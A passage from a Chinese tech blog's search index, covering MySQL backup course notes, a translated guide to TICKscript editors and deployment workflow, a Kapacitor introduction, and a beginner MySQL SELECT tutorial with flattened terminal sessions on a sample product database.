最大的权衡时备份时间与备份负载。可以牺牲其一以增加另外一个。例如，可以提高备份的优先级，代价是降低服务器性能。同样，也可以利用负载的特性来设计备份。 实战项目 实战项目1: 脚本利用LVM快照实现物理备份 实战项目2: 编写MySQL备份脚本（逻辑/物理/完全/增量） 实战项目3: 总结物理备份和逻辑备份的区别 实战项目4: 将 MySQL 中的数据迁移到 MariaDB 总结重点掌握 备份概念 备份的过程 Mysqldump命令 二进制日志 不同的备份方法的原理以及备份过程中会遇到的问题 清楚每一种备份方法的优缺点 掌握备份数据的还原 难点 备份与冗余的区别 备份中服务可用性与数据一致性 MVCC版本控制机制 备份中数据一致性和服务可用性的理解 Percona XtraBackup增量备份和还原的原理","link":"/2016/12/29/booboo_mysql/03-MySQL-backup-and-recovery/"},{"title":"TICKscripts开发规范","text":"TICKscripts开发规范 开发环境 Chronograf Web UI Vim集成 Emacs主要模式 Atom集成 JetBrains 插件 Visual Studio代码插件 推荐的开发工作流程 源控制是必须的 存储库结构 测试和部署更改 结论 TICKscripts开发规范 The State of TICKscript Development 了解使用TICK堆栈进行开发的工具以及如何编写TICKscripts以充分利用Kapacitor的监控和警报。 为了充分利用Kapacitor（TICK Stack的’K’ ）及其提供的监控和警报，您和您的团队将需要编写TICKscripts。TICKscript是一种简单而强大的方法，可以对流经InfluxDB的数据进行聚合，分析和警报。在这篇文章中，我将介绍可用于编写TICKscripts的各种工具，并重点介绍我在组织脚本开发过程时看到的一些常见模式。让我们首先重点介绍一些可用于编写TICKscripts的开发工具。各种编辑器和IDE的插件由社区提供，不由InfluxData维护。如果您有一个可能缺少TICKscript编辑器的收藏编辑器，我们建议您创建一个并在社区页面上共享它。 开发环境每个开发人员都有一个他们用来编写和部署代码的最喜欢的IDE。下面是我们了解开发人员用于编写TICKscripts的各种工具的快速概述。 Chronograf Web UI启动和运行编写TICKscripts的最快方法之一是通过Chronograf UI中的内置编辑器完成。要开始使用，请确保您可以访问在某处运行的完整TICK堆栈。如果您想在机器上试用，请查看本教程，了解如何设置和连接所有内容。可以在创建子菜单的“警报”选项卡下找到TICKscript编辑器。 从那里，您有两个选择：您可以使用UI中的向导创建警报规则，也可以创建和编辑自定义TICKscript以执行您喜欢的任何操作。在幕后，警报向导将生成一个TICKscript，然后您可以进入并稍后手动编辑。这可以作为您可以用于进一步自定义的起点。要记住的一件事是Chronograf UI只会与您选择的链接Kapacitor实例进行交互。这是它将提取脚本列表以及显示的实际代码的位置。如果您在Kapacitor机器上本地存储了文件，则在通过此UI进行更改时，需要手动同步这些文件。此外，在Chronograf的1.4版本中，我们推出了一款新的Kapacitor日志查看器，可以让您查看任何输出log()命令就在你的浏览器中。这对调试脚本非常有用。 Vim集成对于那些不喜欢离开终端的人来说，还有一个由InfluxData自己的Nathaniel Cook维护的Vim插件。它可以在vim-tickscript GitHub repo中找到。使用您最喜欢的Vim插件管理器快速安装，但是README文件中提供了Pathogen和vim-plug的说明。安装后，您可以运行:TickInstallBinaries将添加tickfmt到路径以格式化脚本的命令。当我安装它时，由于我不使用Vim进行开发，我还需要安装vim-go插件，否则当我尝试运行脚本安装时我看到了一堆错误tickfmt。默认情况下，此插件会在您每次保存时自动格式化脚本，但可以在首选项中更改。 Emacs主要模式当然，如果我们谈论Vim，我们需要给予Emacs相同的时间。Marc Sherry 为TICKscript文件制作了一个非常棒的Emacs主要模式，并与社区分享。除了语法高亮和格式化之外，它还允许您通过Emacs命令运行常见的Kapacitor功能。您可以在README文件中找到命令列表。 Atom集成Atom是一个非常灵活的开源文本编辑器，许多开发人员喜欢使用它。Bubba Hines为TICKscript语法高亮显示了一个很好的Atom包。通过Atom软件包安装程序快速简便地进行安装，只需搜索即可完成安装language-tick。它不会自动格式化您的脚本，但语法突出显示有助于快速查找问题。如果您在一个屏幕上查找所有内容，则可以安装该platformio-atom-ide-terminal插件并将其用于在Kapacitor中测试和安装脚本。 JetBrains 插件JetBrains IntelliJ平台还支持Tikscript编辑，由Vladislav Rassokhin和他的intellij-kapacitor插件提供。这可以在任何基于IntelliJ的IDE上使用，包括GoLand或IDEA。与Atom插件一样，它具有语法高亮功能，内置的终端面板可以在同一个窗口中轻松更新Kapacitor中的脚本。您还可以使用命令单击快速跳转到变量定义，就像编写Java或Go代码一样。 Visual Studio代码插件最后但并非最不重要的是，对于那些爱上微软Visual Code工具的人来说，Matt Jones也为此编写了一个TICKscript语法荧光笔插件。安装Visual Code后，通过浏览器中的安装按钮可以轻松安装。与其他IDE一样，Visual Code附带一个集成的终端面板，可用于向Kapacitor发送命令。 推荐的开发工作流程正如您所看到的，可用于编写TICKscripts的工具并不缺乏。但是，拥有合适的工具只是解决方案的一部分。您需要标准化将TICKscripts从本地开发人员计算机移动到生产系统的过程。 让我们从部署环境开始。开发TICKscripts应该像组织中的任何其他类型的代码一样处理，并且不应该直接在生产中编辑脚本。我们的大多数大型用户至少有三个环境正在运行：本地开发环境，集成环境和生产环境。您可能拥有更多，但不管怎样，您将大大增加推出无法正常运行或监控的脚本的机会。所有新脚本或更改都是从左到右流动，而不是相反，无论多小。 源控制是必须的我们的许多客户都将他们的TICKscripts检查到某种源控制系统，通常是Git或SVN。我们建议围绕负责监控的不同团队组织存储库。单个repo应该包含将由单个团队在其Kapacitor实例或集群上部署的所有TICKscripts。这不仅使部署脚本变得更容易（存储库根目录下的一个shell脚本可以快速扫描仓库中的所有TICKscripts并通过Kapacitor API加载它们），但它也使得查找，添加更容易并修复它们，因为每个团队都管理自己的。 我们看到的另一种常见模式是，当有一个集中式基础架构团队跟踪部署到公司中每个Kapacitor实例的核心TICKscripts时。然后，每个团队也可以拥有自己的存储库和自己的脚本集。这里的想法是确保团队不必请求彼此的许可进行更改，因为每个团队都有自己的存储库，可以使用自己的TICKscripts进行管理。 存储库结构有许多不同的方法来构建包含TICKscripts的存储库，包括将根目录中的所有脚本整齐地分类到文件夹中。如果您计划在Kapacitor中利用基于文件的脚本加载，则需要维护预定义的结构。无论它们是如何组织的，当它们被发送到Kapacitor时，每个都只是通过它们的名称引用，因此我们建议将有用的关键字编码到文件和脚本的实际名称中。例如，如果数据组具有监视Kafka群集上的高CPU的警报，则脚本文件名可能是data-team-kafka-high-cpu.tick使用相应的脚本名称。当然，您可以自由选择您喜欢的任何格式，但我们的建议是在每个Kapacitor实例上保持一致，并尽可能多地将可搜索的信息编码到其中。还要记住，结果是从Kapacitor API按字母顺序返回的。 测试和部署更改对TICKscripts进行更改的过程也应遵循标准开发最佳实践。开发人员应首先从源代码控制中检出存储库，进行更改（可能在不同的分支上），并在将其更新回主分支之前让其他团队成员审查更改代码。您也可以编写单元测试您的TICKscripts使用此真棒库贡萨洛佩斯塔纳。使用此单元测试框架，您可以定义应触发警报的示例数据，并验证它是否按预期工作。这些单元测试应与TICKscripts位于同一个存储库中。 将代码合并回主分支后，应将其部署到测试环境，以便使用自动脚本进行集成测试。您的集成环境应尽可能地模仿您的生产环境，以便可以在此处发现与其他脚本或警报的任何问题或冲突，而不是生产。您应该能够使用样本数据生成模拟您在集成环境中尝试提醒的问题。 最后，一旦您的TICKscript被验证在您的集成环境中工作，它应该使用部署脚本自动加载到您的生产环境中。 所有这些听起来可能听起来像开始时需要做很多工作，但是前面的一点投资会多次回报，提高灵活性并为您的生产系统提供适当的警报。 结论对于那些刚刚开始使用TICKscripts的人，我希望我能够在工具和开发过程方面为您指明正确的方向。如果您已经部署了大量TICKscripts，请在评论中告诉我们您是否有一些有用的提示和技巧来开发和维护脚本。 编辑器：atom 安装插件 language-tick 测试库：kapacitor-unit 开发过程：本地开发环境，集成环境和生产环境 存储结构： 基于文件的脚本加载","link":"/2020/04/14/booboo_tick/kapacitor/TICKscriptsDevelopmentSpecification/"},{"title":"Kapacitor简介","text":"Kapacitor简介 主要特点 学习路径 awsome tools Kapacitor是一个开源数据处理框架，可以轻松创建警报，运行ETL作业和检测异常。Kapacitor是TICK堆栈的最后一块。 主要特点以下是Kapacitor目前支持的一些功能，使其成为数据处理的绝佳选择。 支持两种处理方式：流处理和批处理。 通过任务调度，有计划地从InfluxDB数据库中查询数据，且InfluxDB的数据来源非常广泛，只要符合influx协议即可插入数据库。 通过InfluxQL实现数据的转换。 可以将转换后的数据存储在InfluxDB中。 支持自用户定义的函数。 可以与HipChat，OpsGenie，Alerta，Sensu，PagerDuty，Slack等进行集成（专业的告警管理通知组件）。 学习路径 No. 内容 难度 1 Kapacitor安装 * 2 TICKscript语言 *** 3 Kapacitor配置文件 ** 4 Kapacitor命令行 **** 5 Kapacitor监控案例 ** awsome toolsAnsible Kapacitor Linux上Kapacitor的配置管理和变更自动化 kapacitor-course kapacitor 脚本教程 influx-stress InfluxDB压测工具 InfluxData Sandbox TICK 沙箱","link":"/2020/04/14/booboo_tick/kapacitor/kapacitor-introduce/"},{"title":"MySQL 管理课程 第三课 结构化查询语言SQL介绍和基本操作1","text":"本章将通过丰富的实例对 SQL 语言的基础进行详细介绍,MySQL,使得读者不但能够学习到标准 SQL 的使用,又能够学习到 MySQL 中一些扩展 SQL 的使用方法。该教案根据《MySQL必知必会》撰写。 了解SQL什么是SQL SQL 简介 当面对一个陌生的数据库时,通常需要一种方式与它进行交互,以完成用户所需要的各种工作,这个时候,就要用到 SQL 语言了。 SQL 是 Structure Query Language(结构化查询语言)的缩写,它是使用关系模型的数据库应用语言,由 IBM 在 20 世纪 70 年代开发出来,作为 IBM 关系数据库原型 System R 的原型关系语言,实现了关系数据库中的信息检索。 20 世纪 80 年代初,美国国家标准局(ANSI)开始着手制定 SQL 标准,最早的 ANSI 标准于1986 年完成,就被叫作 SQL-86。标准的出台使 SQL 作为标准关系数据库语言的地位得到了加强。SQL 标准目前已几经修改更趋完善。 正是由于 SQL 语言的标准化,所以大多数关系型数据库系统都支持 SQL 语言,它已经发展成为多种平台进行交互操作的底层会话语言。 这里用了(My)SQL 这样的标题,目的是在介绍标准 SQL 的同时,也将一些 MySQL 在标准 SQL上的扩展一同介绍给大家。希望读者看完本节后,能够对标准 SQL 的基本语法和 MySQL 的部分扩展语法有所了解。 SQL 分类 SQL 语句主要可以划分为以下 4 个类别。 DDL(Data Definition Languages)语句:数据定义语言,这些语句定义了不同的数据段、数据库、表、列、索引等数据库对象的定义。常用的语句关键字主要包括 create、drop、alter等。 DML(Data Manipulation Language)语句:数据操纵语句,用于添加、删除、更新和查询数据库记录,并检查数据完整性,常用的语句关键字主要包括 insert、delete、udpate 和select 等。 DCL(Data Control Language)语句:数据控制语句,用于控制不同数据段直接的许可和访问级别的语句。这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要的语句关键字包括 grant、revoke 等。 DQL(Data Query Language)语句:数据查询语句，用于从一个或多个表中检索信息。 MySQL中的语法格式 SQL语句是由简单的英语单词构成的。这些单词称为关键字,每个SQL语句都是由一个或多个关键字构成的。 结束SQL语句 多条SQL语句必须以分号(;)分隔。MySQL如同多数DBMS一样,不需要在单条SQL语句后加分号。但特定的DBMS可能必须在单条SQL语句后加上分号。当然,如果愿意可以总是加上分号。事实上,即使不一定需要,但加上分号肯定没有坏处。如果你使用的是 mysql命令行,必须加上分号来结束 SQL 语句。 SQL语句和大小写 请注意,SQL语句不区分大小写,因此SELECT 与 select 是相同的。同样,写成 Select 也没有关系。许多SQL开发人员喜欢对所有SQL关键字使用大写,而对所有列和表名使用小写,这样做使代码更易于阅读和调试。 使用空格 在处理SQL语句时,其中所有空格都被忽略。SQL语句可以在一行上给出,也可以分成许多行。多数SQL开发人员认为将SQL语句分成多行更容易阅读和调试。 学习样例表获取方法 学习样例mysql_scripts.zip存放在uplooking教室共享路径为http://classroom.example.com/content/MYSQL/04-others/mysql_scripts.zip 。 可以在连接互联网的情况下，访问http://www.forta.com/books/0672327120/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120[root@mastera0 ~]# yum install -y wget vim net-tools unzip[root@mastera0 ~]# wget http://classroom.example.com/content/MYSQL/04-othersmysql_scripts.zip[root@mastera0 ~]# lsanaconda-ks.cfg mysql_scripts.zip[root@mastera0 ~]# unzip mysql_scripts.zip[root@mastera0 ~]# lsanaconda-ks.cfg create.sql mysql_scripts.zip populate.sql[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 4Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || test |+--------------------+4 rows in set (0.00 sec)MariaDB [(none)]&gt; exitBye# 导入create.sql到test库，将会创建一些表[root@mastera0 ~]# mysql -uroot -puplooking test &lt; create.sql[root@mastera0 ~]# mysql -uroot -puplooking -e &quot;show tables from test&quot;;+----------------+| Tables_in_test |+----------------+| customers || orderitems || orders || productnotes || products || vendors |+----------------+# 导入populate.sql到test库，将会向表中新增数据[root@mastera0 ~]# mysql -uroot -puplooking test &lt; populate.sql[root@mastera0 ~]# mysql -uroot -puplooking -e &quot;select * from test.vendors&quot;;+---------+----------------+-----------------+-------------+------------+----------+--------------+| vend_id | vend_name | vend_address | vend_city | vend_state | vend_zip | vend_country |+---------+----------------+-----------------+-------------+------------+----------+--------------+| 1001 | Anvils R Us | 123 Main Street | Southfield | MI | 48075 | USA || 1002 | LT Supplies | 500 Park Street | Anytown | OH | 44333 | USA || 1003 | ACME | 555 High Street | Los Angeles | CA | 90046 | USA || 1004 | Furball Inc. | 1000 5th Avenue | New York | NY | 11111 | USA || 1005 | Jet Set | 42 Galaxy Road | London | NULL | N16 6PS | England || 1006 | Jouets Et Ours | 1 Rue Amusement | Paris | NULL | 45678 | France |+---------+----------------+-----------------+-------------+------------+----------+--------------+[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 15Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.# 查询所有的数据库MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || test |+--------------------+4 rows in set (0.00 sec)# 使用test库MariaDB [(none)]&gt; use test;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changed# 查询test库中所有表MariaDB [test]&gt; show tables;+----------------+| Tables_in_test |+----------------+| customers || orderitems || orders || productnotes || products || vendors |+----------------+6 rows in set (0.00 sec)# 查询test库中products表的结构， describe是show columns from的别名# DESCRIBE tbl_name# SHOW [FULL] COLUMNS FROM tbl_name [FROM db_name] [like_or_where]MariaDB [test]&gt; desc products;+------------+--------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+------------+--------------+------+-----+---------+-------+| prod_id | char(10) | NO | PRI | NULL | || vend_id | int(11) | NO | MUL | NULL | || prod_name | char(255) | NO | | NULL | || prod_price | decimal(8,2) | NO | | NULL | || prod_desc | text | YES | | NULL | |+------------+--------------+------+-----+---------+-------+5 rows in set (0.00 sec)MariaDB [test]&gt; show columns from test.products;+------------+--------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+------------+--------------+------+-----+---------+-------+| prod_id | char(10) | NO | PRI | NULL | || vend_id | int(11) | NO | MUL | NULL | || prod_name | char(255) | NO | | NULL | || prod_price | decimal(8,2) | NO | | NULL | || prod_desc | text | YES | | NULL | |+------------+--------------+------+-----+---------+-------+5 rows in set (0.00 sec) 本教案中所有章节中使用的数据库表都是关系表，关于每个表及关系的描述,如下所示： 样例表为一个想象的随身物品推销商使用的订单录入系统,这些随身物品可能是你喜欢的卡通人物需要的(是的,卡通人物,没人规定学习MySQL必须沉闷地学)。这些表用来完成以下几个任务: 管理供应商; 管理产品目录; 管理顾客列表; 录入顾客订单。 要完成这几个任务需要作为关系数据库设计成分的紧密联系的6个表。 vendors 表 存储销售产品的供应商。每个供应商在这个表中有一个记录,供应商ID( vend_id )列用来匹配产品和供应商。 vendors 表的列 说明 vend_id 唯一的供应商ID vend_name 供应商名 vend_address 供应商的地址 vend_city 供应商的城市 vend_state 供应商的州 vend_zip 供应商的邮政编码 vend_country 供应商的国家 products 表 包含产品目录,每行一个产品。每个产品有唯一的ID( prod_id 列),通过 vend_id (供应商的唯一ID)关联到它的供应商。 products 表的列 说明 prod_id 唯一的产品ID vend_id 产品供应商ID(关联到vendors表中的vend_id) prod_name 产品名 prod_price 产品价格 prod_desc 产品描述 customers 表 存储所有顾客的信息。每个顾客有唯一的ID( cust_id列)。 customers 表的列 说明 cust_id 唯一的顾客ID cust_name 顾客名 cust_address 顾客的地址 cust_city 顾客的城市 cust_state 顾客的州 cust_zip 顾客的邮政编码 cust_country 顾客的国家 cust_contact 顾客的联系名 cust_email 顾客的联系email地址 orderitems 表 存储每个订单中的实际物品,每个订单的每个物品占一行。对 orders 中的每一行, orderitems 中有一行或多行。每个订单物品由订单号加订单物品(第一个物品、第二个物品等)唯一标识。订单物品通过 order_num 列(关联到 orders 中订单的唯一ID)与它们相应的订单相关联。此外,每个订单项包含订单物品的产品ID(它关联物品到products 表)。 orderitems 表的列 说明 order_num 订单号(关联到orders表的order_num) order_item 订单物品号(在某个订单中的顺序) prod_id 产品ID(关联到products表的prod_id) quantity 物品数量 item_price 物品价格 productnotes 表存储与特定产品有关的注释。并非所有产品都有相关的注释,而有的产品可能有许多相关的注释。 productnotes 表的列 说明 note_id 唯一注释ID prod_id 产品ID(对应于products表中的prod_id) note_date 增加注释的日期 note_text 注释文本 DQL语言DQL(Data Query Language)语句:数据查询语句，用于从一个或多个表中检索信息。本章介绍如何使用 SELECT 语句从表中检索一个或多个数据列。 检索数据 数据插入到数据库中后,就可以用 SELECT 命令进行各种各样的查询,使得输出的结果符合我们的要求。由于 SELECT 的语法很复杂,所有这里只介绍最基本的语法 大概,最经常使用的SQL语句就是 SELECT 语句了。它的用途是从一个或多个表中检索信息。 为了使用 SELECT 检索表数据,必须至少给出两条信息——想选择什么,以及从什么地方选择。 我们将从简单的SQL SELECT 语句开始介绍,此语句如下所示: 检索单个列 利 用 SELECT 语 句 从 products 表 中 检 索 一 个 名 为prod_name 的列。所需的列名在 SELECT 关键字之后给出, FROM关键字指出从其中检索数据的表名。 1234567891011121314151617181920MariaDB [test]&gt; select prod_name from products;+----------------+| prod_name |+----------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil || Detonator || Bird seed || Carrots || Fuses || JetPack 1000 || JetPack 2000 || Oil can || Safe || Sling || TNT (1 stick) || TNT (5 sticks) |+----------------+14 rows in set (0.00 sec) 未排序数据 如果读者自己试验这个查询,可能会发现显示输出的数据顺序与这里的不同。出现这种情况很正常。如果没有明确排序查询结果(下一章介绍),则返回的数据的顺序没有特殊意义。返回数据的顺序可能是数据被添加到表中的顺序,也可能不是。只要返回相同数目的行,就是正常的。 使用空格 在处理SQL语句时,其中所有空格都被忽略。SQL语句可以在一行上给出,也可以分成许多行。多数SQL开发人员认为将SQL语句分成多行更容易阅读和调试。 检索多个列 使用 SELECT 语句从表 products中选择数据,指定3个列名prod_id,prod_name,prod_price,列名之间用逗号分隔。 1234567891011121314151617181920MariaDB [test]&gt; select prod_id,prod_name,prod_price from products;+---------+----------------+------------+| prod_id | prod_name | prod_price |+---------+----------------+------------+| ANV01 | .5 ton anvil | 5.99 || ANV02 | 1 ton anvil | 9.99 || ANV03 | 2 ton anvil | 14.99 || DTNTR | Detonator | 13.00 || FB | Bird seed | 10.00 || FC | Carrots | 2.50 || FU1 | Fuses | 3.42 || JP1000 | JetPack 1000 | 35.00 || JP2000 | JetPack 2000 | 55.00 || OL1 | Oil can | 8.99 || SAFE | Safe | 50.00 || SLING | Sling | 4.49 || TNT1 | TNT (1 stick) | 2.50 || TNT2 | TNT (5 sticks) | 10.00 |+---------+----------------+------------+14 rows in set (0.00 sec) 当心逗号 在选择多个列时,一定要在列名之间加上逗号,但最后一个列名后不加。如果在最后一个列名后加了逗号,将出现错误。 数据表示 从上述输出可以看到,SQL语句一般返回原始的、无格式的数据。数据的格式化是一个表示问题,而不是一个检索问题。因此,表示(对齐和显示上面的价格值,用货币符号和逗号表示其金额)一般在显示该数据的应用程序中规定。一般很少使用实际检索出的原始数据(没有应用程序提供的格式)。 检索所有列 除了指定所需的列外(如上所述,一个或多个列), SELECT 语句还可以检索所有的列而不必逐个列出它们。这可以通过在实际列名的位置使用星号( * )通配符来达到,使用 SELECT 语句从表 products中选择所有数据。 1234567891011121314151617181920MariaDB [test]&gt; select * from products;+---------+---------+----------------+------------+----------------------------------------------------------------+| prod_id | vend_id | prod_name | prod_price | prod_desc |+---------+---------+----------------+------------+----------------------------------------------------------------+| ANV01 | 1001 | .5 ton anvil | 5.99 | .5 ton anvil, black, complete with handy hook || ANV02 | 1001 | 1 ton anvil | 9.99 | 1 ton anvil, black, complete with handy hook and carrying case || ANV03 | 1001 | 2 ton anvil | 14.99 | 2 ton anvil, black, complete with handy hook and carrying case || DTNTR | 1003 | Detonator | 13.00 | Detonator (plunger powered), fuses not included || FB | 1003 | Bird seed | 10.00 | Large bag (suitable for road runners) || FC | 1003 | Carrots | 2.50 | Carrots (rabbit hunting season only) || FU1 | 1002 | Fuses | 3.42 | 1 dozen, extra long || JP1000 | 1005 | JetPack 1000 | 35.00 | JetPack 1000, intended for single use || JP2000 | 1005 | JetPack 2000 | 55.00 | JetPack 2000, multi-use || OL1 | 1002 | Oil can | 8.99 | Oil can, red || SAFE | 1003 | Safe | 50.00 | Safe with combination lock || SLING | 1003 | Sling | 4.49 | Sling, one size fits all || TNT1 | 1003 | TNT (1 stick) | 2.50 | TNT, red, single stick || TNT2 | 1003 | TNT (5 sticks) | 10.00 | TNT, red, pack of 10 sticks |+---------+---------+----------------+------------+----------------------------------------------------------------+14 rows in set (0.00 sec) 使用通配符 一般,除非你确实需要表中的每个列,否则最好别使用 * 通配符。虽然使用通配符可能会使你自己省事,不用明确列出所需列,但检索不需要的列通常会降低检索和应用程序的性能。 检索未知列 使用通配符有一个大优点。由于不明确指定列名(因为星号检索每个列),所以能检索出名字未知的列。 检索不同的行 正如所见, SELECT 返回所有匹配的行。但是,如果你不想要每个值每次都出现,怎么办?例如,假如你想得出 products 表中产品的所有供应商ID: 1234567891011121314151617181920MariaDB [test]&gt; select vend_id from products;+---------+| vend_id |+---------+| 1001 || 1001 || 1001 || 1002 || 1002 || 1003 || 1003 || 1003 || 1003 || 1003 || 1003 || 1003 || 1005 || 1005 |+---------+14 rows in set (0.00 sec) SELECT 语句返回14行(即使表中只有4个供应商),因为 products 表中列出了14个产品。那么,如何检索出有不同值的列表呢? DISTINCT 关键字 顾名思义,此关键字指示MySQL只返回不同的值。 SELECT DISTINCT vend_id 告诉MySQL只返回不同(唯一)的vend_id行,因此只返回4行,如下面的输出所示。如果使用DISTINCT 关键字,它必须直接放在列名的前面。 12345678910MariaDB [test]&gt; select distinct vend_id from products;+---------+| vend_id |+---------+| 1001 || 1002 || 1003 || 1005 |+---------+4 rows in set (0.01 sec) 不能部分使用 DISTINCT DISTINCT 关键字应用于所有列而不仅是前置它的列。如果给出 SELECT DISTINCT vend_id,prod_price ,除非指定的两个列都不同,否则所有行都将被检索出来。 限制结果 SELECT 语句返回所有匹配的行,它们可能是指定表中的每个行。为了返回第一行或前几行,可使用 LIMIT 子句。下面举一个例子:用 SELECT 语句检索单个列返回不多于5行。 1234567891011121314151617181920212223242526272829303132MariaDB [test]&gt; select prod_name from products;+----------------+| prod_name |+----------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil || Detonator || Bird seed || Carrots || Fuses || JetPack 1000 || JetPack 2000 || Oil can || Safe || Sling || TNT (1 stick) || TNT (5 sticks) |+----------------+14 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name from products limit 5;+--------------+| prod_name |+--------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil || Detonator || Bird seed |+--------------+5 rows in set (0.00 sec) LIMIT 5, 5 指示MySQL返回从行5开始的5行。第一个数为开始位置,第二个数为要检索的行数。 1234567891011MariaDB [test]&gt; select prod_name from products limit 5,5;+--------------+| prod_name |+--------------+| Carrots || Fuses || JetPack 1000 || JetPack 2000 || Oil can |+--------------+5 rows in set (0.00 sec) 所以,带一个值的 LIMIT 总是从第一行开始,给出的数为返回的行数。带两个值的 LIMIT 可以指定从行号为第一个值的位置开始。 行 0 检索出来的第一行为行0而不是行1。因此,LIMIT 1, 1将检索出第二行而不是第一行 1234567891011121314151617181920212223MariaDB [test]&gt; select prod_name from products limit 1,1;+-------------+| prod_name |+-------------+| 1 ton anvil |+-------------+1 row in set (0.00 sec)MariaDB [test]&gt; select prod_name from products limit 0,1;+--------------+| prod_name |+--------------+| .5 ton anvil |+--------------+1 row in set (0.00 sec)MariaDB [test]&gt; select prod_name from products limit 1;+--------------+| prod_name |+--------------+| .5 ton anvil |+--------------+1 row in set (0.00 sec) 在行数不够时 LIMIT 中指定要检索的行数为检索的最大行数。如果没有足够的行(例如,给出 LIMIT 10, 5,但只有13行),MySQL将只返回它能返回的那么多行。 123456789101112131415MariaDB [test]&gt; select prod_name from products limit 5,10;+----------------+| prod_name |+----------------+| Carrots || Fuses || JetPack 1000 || JetPack 2000 || Oil can || Safe || Sling || TNT (1 stick) || TNT (5 sticks) |+----------------+9 rows in set (0.00 sec) MySQL 5的 LIMIT 语法 LIMIT 3, 4 的含义是从行4开始的3行还是从行3开始的4行?如前所述,它的意思是从行3开始的4行,这容易把人搞糊涂。由于这个原因, MySQL 5支持 LIMIT 的另一种替代语法。 LIMIT4 OFFSET 3 意为从行3开始取4行,就像 LIMIT 3, 4 一样。 123456789101112131415161718192021MariaDB [test]&gt; select prod_name from products limit 3,4;+-----------+| prod_name |+-----------+| Detonator || Bird seed || Carrots || Fuses |+-----------+4 rows in set (0.00 sec)MariaDB [test]&gt; select prod_name from products limit 4 offset 3;+-----------+| prod_name |+-----------+| Detonator || Bird seed || Carrots || Fuses |+-----------+4 rows in set (0.00 sec) 使用完全限定的表名 迄今为止使用的SQL例子只通过列名引用列。也可能会使用完全限定的名字来引用列(同时使用表名和列字)请看以下例子:通过完全限定的表名和列名查询products表的prod_name列的所有值 1234567891011121314151617181920MariaDB [test]&gt; select products.prod_name from products;+----------------+| prod_name |+----------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil || Detonator || Bird seed || Carrots || Fuses || JetPack 1000 || JetPack 2000 || Oil can || Safe || Sling || TNT (1 stick) || TNT (5 sticks) |+----------------+14 rows in set (0.00 sec) 这条SQL语句在功能上等于本章最开始使用的那一条语句,但这里指定了一个完全限定的列名。 表名也可以是完全限定的,如下所示: 1234567891011121314151617181920MariaDB [test]&gt; select products.prod_name from test.products;+----------------+| prod_name |+----------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil || Detonator || Bird seed || Carrots || Fuses || JetPack 1000 || JetPack 2000 || Oil can || Safe || Sling || TNT (1 stick) || TNT (5 sticks) |+----------------+14 rows in set (0.00 sec) 这条语句在功能上也等于刚使用的那条语句。 正如以后章节所介绍的那样,有一些情形需要完全限定名。现在,需要注意这个语法,以便在遇到时知道它的作用。 小结 本章学习了如何使用SQL的 SELECT 语句来检索单个表列、多个表列以及所有表列。下一章将讲授如何排序检索出来的数据。 排序检索数据本章将讲授如何使用 SELECT 语句的 ORDER BY 子句,根据需要排序检索出的数据。 排序数据 利 用 SELECT 语 句 从 products 表 中 检 索 一 个 名 为prod_name 的列。对 prod_name 列以字母顺序排序。 1234567891011121314151617181920MariaDB [test]&gt; select prod_name from products order by prod_name;+----------------+| prod_name |+----------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil || Bird seed || Carrots || Detonator || Fuses || JetPack 1000 || JetPack 2000 || Oil can || Safe || Sling || TNT (1 stick) || TNT (5 sticks) |+----------------+14 rows in set (0.00 sec) 如果不排序 数据一般将以它在底层表中出现的顺序显示。这可以是数据最初添加到表中的顺序。但是,如果数据后来进行过更新或删除,则此顺序将会受到MySQL重用回收存储空间的影响。因此,如果不明确控制的话,不能(也不应该)依赖该排序顺序。关系数据库设计理论认为,如果不明确规定排序顺序,则不应该假定检索出的数据的顺序有意义。 子句(clause) SQL语句由子句构成,有些子句是必需的,而有的是可选的。一个子句通常由一个关键字和所提供的数据组成。子句的例子有 SELECT 语句的 FROM 子句,我们在前一章看到过这个子句。 通过非选择列进行排序 通常, ORDER BY 子句中使用的列将是为显示所选择的列。但是,实际上并不一定要这样,用非检索的列排序数据是完全合法的。 1234567891011121314151617181920MariaDB [test]&gt; select prod_name from products order by vend_id;+----------------+| prod_name |+----------------+| .5 ton anvil || 1 ton anvil || 2 ton anvil || Fuses || Oil can || TNT (1 stick) || Sling || Safe || TNT (5 sticks) || Carrots || Bird seed || Detonator || JetPack 2000 || JetPack 1000 |+----------------+14 rows in set (0.00 sec) 经常需要按不止一个列进行数据排序。例如,如果要显示雇员清单,可能希望按姓和名排序(首先按姓排序,然后在每个姓中再按名排序)。如果多个雇员具有相同的姓,这样做很有用。 为了按多个列排序,只要指定列名,列名之间用逗号分开即可(就像选择多个列时所做的那样)。 按多个列排序 利用SELECT语句从products表中检索3个列(prod_id,prod_name,prod_price)，并按其中两个列对结果进行排序——首先按价格prod_price,然后再按名称prod_name排序。 1234567891011121314151617181920MariaDB [test]&gt; select prod_id,prod_name,prod_price from products order by prod_price,prod_name;+---------+----------------+------------+| prod_id | prod_name | prod_price |+---------+----------------+------------+| FC | Carrots | 2.50 || TNT1 | TNT (1 stick) | 2.50 || 